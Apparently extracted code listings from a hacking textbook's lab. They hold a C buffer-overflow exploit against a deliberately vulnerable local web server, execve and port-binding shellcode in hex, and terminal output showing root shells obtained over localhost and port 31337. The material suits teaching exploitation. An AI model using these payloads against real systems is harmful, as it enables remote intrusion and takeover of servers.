 int sockfd, buflen;\n   struct hostent *host_info;\n   struct sockaddr_in target_addr;\n   unsigned char buffer[600];\n\n   if(argc < 2) {\n      printf(\"Usage: %s <hostname>\\n\", argv[0]);\n      exit(1);\n   }\n\n   if((host_info = gethostbyname(argv[1])) == NULL)\n      fatal(\"looking up hostname\");\n\n   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\n      fatal(\"in socket\");\n\n   target_addr.sin_family = AF_INET;\n   target_addr.sin_port = htons(80);\n   target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\n   memset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\n\n   if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\n      fatal(\"connecting to target server\");\n\n   bzero(buffer, 600);                      // Zero out the buffer.\n   memset(buffer, '\\x90', OFFSET);          // Build a NOP sled.\n   *((u_int *)(buffer + OFFSET)) = RETADDR; // Put the return address in\n   memcpy(buffer+300, shellcode, strlen(shellcode)); // shellcode.\n   strcat(buffer, \"\\r\\n\");                  // Terminate the string.\n   printf(\"Exploit buffer:\\n\");\n   dump(buffer, strlen(buffer));  // Show the exploit buffer.\n   send_string(sockfd, buffer);   // Send exploit buffer as an HTTP request.\n\n   exit(0);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc tinyweb_exploit.c \nreader@hacking:~/booksrc $ ./a.out 127.0.0.1\nExploit buffer:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db | ............1.1.\n31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 2f 2f 73 68 | 1......j.XQh//sh\n68 2f 62 69 6e 89 e3 51 89 e2 53 89 e1 cd 80 90 | h/bin..Q..S.....\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a                                           | .. \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./tinyweb\nAccepting web requests on port 80\nGot request from 127.0.0.1:53908 \"GET / HTTP/1.1\"\n        Opening './webroot/index.html'   200 OK\nGot request from 127.0.0.1:40668 \"GET /image.jpg HTTP/1.1\"\n        Opening './webroot/image.jpg'    200 OK\nGot request from 127.0.0.1:58504 \n\"\n\n1 1 1  j\n\n                                         XQh//shh/binS \n\n\"\n NOT HTTP! \nsh-3.2#\n```", "```\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\n92 portbinding_shellcode\nreader@hacking:~/booksrc $ hexdump -C portbinding_shellcode\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10  |.jfXCRfhzifS..j.|\n00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80  |QV.....fCCSV....|\n00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f  |.fCRRV.....j.Y.?|\n00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62  |..Iy...Rh//shh/b|\n00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80              |in..R..S....|\n0000005c\nreader@hacking:~/booksrc $ od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\\\x/g'\n\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\n\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\n\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\n\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\n\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\n\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80\n\nreader@hacking:~/booksrc $ \n```", "```\nchar shellcode[]=\n\"\\x6a\\x66\\x58\\x99\\x31\\xdb\\x43\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\"\n\"\\x96\\x6a\\x66\\x58\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x10\"\n\"\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x53\\x56\\x89\\xe1\\xcd\\x80\"\n\"\\xb0\\x66\\x43\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\"\n\"\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\"\n\"\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80\";\n// Port-binding shellcode on port 31337\n```", "```\nreader@hacking:~/booksrc $ gcc tinyweb_exploit2.c \nreader@hacking:~/booksrc $ ./a.out 127.0.0.1\nExploit buffer:\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 6a 66 58 99 | ............jfX.\n31 db 43 52 6a 01 6a 02 89 e1 cd 80 96 6a 66 58 | 1.CRj.j......jfX\n43 52 66 68 7a 69 66 53 89 e1 6a 10 51 56 89 e1 | CRfhzifS..j.QV..\ncd 80 b0 66 43 43 53 56 89 e1 cd 80 b0 66 43 52 | ...fCCSV.....fCR\n52 56 89 e1 cd 80 93 6a 02 59 b0 3f cd 80 49 79 | RV.....j.Y.?..Iy\nf9 b0 0b 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 | ...Rh//shh/bin..\n52 89 e2 53 89 e1 cd 80 90 90 90 90 90 90 90 90 | R..S............\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................\n90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................\n0d 0a                                           | ..\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\nls -l /etc/passwd \n-rw-r--r-- 1 root root 1545 Sep  9 16:24 /etc/passwd\n```", "```\nreader@hacking:~/booksrc $ wc -c portbinding_shellcode\n92 portbinding_shellcode\nreader@hacking:~/booksrc $ echo $((540+4 - 300 - 92))\n152\nreader@hacking:~/booksrc $ echo $((152 / 4))\n38\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300';\n> cat portbinding_shellcode \n> perl -e 'print \"\\x88\\xf6\\xff\\xbf\"x38 . \\r\\n\"')\n\n\"\n\n\n jfX1CRj j  jfXC\nRfhzifSj QV fCCSV fCRRV j Y? Iy\n                                            Rh//shh/binRS \n\"\n\"\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x300'; cat portbinding_shellcode; \nperl -e 'print \"\\x88\\xf6\\xff\\xbf\"x38 . \"\\r\\n\"') | nc -v -w1 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\nreader@hacking:~/booksrc $ nc -v 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami \nroot\n```"]